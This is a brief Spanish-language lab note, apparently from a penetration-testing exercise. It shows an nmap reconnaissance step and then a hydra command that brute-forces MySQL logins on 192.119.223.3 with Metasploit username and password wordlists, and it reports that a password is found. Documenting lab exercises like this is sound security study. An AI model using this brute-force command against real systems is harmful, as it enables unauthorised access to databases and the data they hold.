Hacemos un reconocimiento con nmap para saber por donde está corriendo la base de datos MySQL:
![[Pasted image 20240613010348.png]]

Lo haríamos con este comando:
```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.119.223.3 mysql
```
Y nos encuentra la contraseña:
![[Pasted image 20240613010353.png]]

